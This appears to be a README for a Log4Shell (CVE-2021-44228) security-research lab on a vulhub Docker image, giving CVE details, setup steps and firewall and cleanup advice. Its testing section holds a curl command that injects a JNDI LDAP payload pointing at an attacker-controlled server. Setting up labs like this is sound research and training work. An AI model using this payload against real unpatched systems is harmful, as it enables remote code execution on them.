# Log4j RCE (CVE-2021-44228)

## Vulnerability Description

Apache Log4j2 JNDI remote code execution vulnerability, also known as Log4Shell, is one of the most severe vulnerabilities in recent years. Attackers can exploit Log4j's logging functionality to trigger JNDI remote loading by constructing special log messages, thereby executing arbitrary code.

## CVE Information

- **CVE ID**: CVE-2021-44228
- **Vulnerability Type**: RCE (Remote Code Execution)
- **Severity**: Critical
- **Affected Versions**: Log4j 2.0 ~ 2.14.1

## Environment Information

- **Image**: vulhub/log4j:2.17.0
- **Port**: 8989
- **Service**: Log4j RCE testing environment

## Usage

1. Execute the userdata script on the cloud server
2. The script will automatically install Docker and start the Log4j vulnerability environment
3. Access `http://<your-ip>:8989` for testing

## Testing Method

```bash
# Send malicious request using curl
curl -X GET "http://<your-ip>:8989" -H "X-Api-Version: \${jndi:ldap://<your-attacker-server>/Exploit}"
```

## Notes

- This environment is for security research only
- Please restrict access sources in the firewall
- Please delete the environment in time after testing

## References

- [Vulhub Log4j Vulnerability Environment](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228)
- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
